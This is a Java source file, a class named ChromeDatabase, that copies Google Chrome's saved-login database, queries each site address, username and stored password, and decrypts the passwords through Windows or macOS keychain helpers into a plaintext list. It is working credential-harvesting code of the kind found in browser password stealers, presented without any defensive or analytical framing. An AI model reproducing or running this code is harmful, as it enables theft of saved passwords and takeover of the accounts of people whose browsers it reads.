package random.chrom;

import org.sqlite.SQLiteConfig;
import org.sqlite.SQLiteConfig.TransactionMode;
import random.util.ChromeSecurity;
import random.util.OperatingSystem;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ChromeDatabase {

    private static final Logger LOG = Logger.getLogger(ChromeDatabase.class.getName());

    public static ChromeDatabase connect(final File database) throws IOException {
        Path tempDB;
        try {
            tempDB = Files.createTempFile("CHROME_LOGIN_", null);
            final FileOutputStream out = new FileOutputStream(tempDB.toFile());
            Files.copy(Paths.get(database.getPath()), out);
            out.close();
            tempDB.toFile().deleteOnExit();
        } catch (final IOException e) {
            throw new IOException("Error copying database! Does the login file exist?");
        }
        Connection db;
        try {
            final SQLiteConfig config = new SQLiteConfig();
            config.setReadOnly(true);

            config.setTransactionMode(TransactionMode.EXCLUSIVE);
            db = config.createConnection("jdbc:sqlite:" + tempDB.toString());
            db.setAutoCommit(true);
        } catch (final SQLException e) {
            throw new IOException("Error connecting to database! Is database corrupted?");
        }
        return new ChromeDatabase(db);
    }

    private final Connection connection;

    private ChromeDatabase(final Connection connection) {
        this.connection = connection;
    }

    public void close() {
        try {
            connection.close();
        } catch (final SQLException e) {
            LOG.log(Level.SEVERE, e.getMessage(), e);
        }
    }

    public ArrayList<ChromeAccount> selectAccounts() throws Exception {
        try {
            if (connection.isClosed()) {
                throw new IOException("Connection to database has been terminated! Cannot fetch accounts.");
            }
        } catch (final SQLException e) {
            throw new IOException("Connection status to the database could not be determined. Has chrome updated?");
        }
        final ArrayList<ChromeAccount> accounts = new ArrayList<>();
        try {
            final String loginQuery = "SELECT action_url, username_value, password_value FROM logins";
            final ResultSet results = connection.createStatement().executeQuery(loginQuery);
            while (results.next()) {
                String address, username, password;
                try {
                    address = results.getString("action_url");
                    username = results.getString("username_value");
                    switch (OperatingSystem.getOperatingSystem()) {
                        case WINDOWS:
                            password = ChromeSecurity.getWin32Password(results.getBytes("password_value"));
                            break;
                        case MAC:
                            password = ChromeSecurity.getOSXKeychainPasswordAsAdmin(address);
                            break;
                        default:
                            throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
                    }
                    accounts.add(new ChromeAccount(username, password, address));
                } catch (final SQLException e) {
                    LOG.log(Level.SEVERE, e.getMessage(), e);
                }
            }
            results.close();
            results.getStatement().close();
        } catch (final SQLException e) {
            throw new IOException("Error reading database. Is the file corrupted?");
        }
        return accounts;
    }
}
